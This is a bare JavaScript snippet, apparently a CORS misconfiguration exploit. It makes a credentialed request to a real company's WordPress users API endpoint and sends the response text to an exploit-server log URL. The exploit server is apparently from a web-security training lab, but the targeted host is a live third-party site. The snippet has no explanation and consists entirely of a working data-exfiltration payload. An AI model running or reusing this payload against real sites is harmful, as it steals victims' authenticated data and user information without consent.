var req = new XMLHttpRequest(); req.onload = reqListener;
req.open('get', 'https://home.ibotta.com/wp-json/wp/v2/users', true); req.withCredentials = true; req.send('{}');

function reqListener() {location='https://exploit-0af200d8048bfc7dc120247801910073.web-security-academy.net/log?key='+this.responseText; };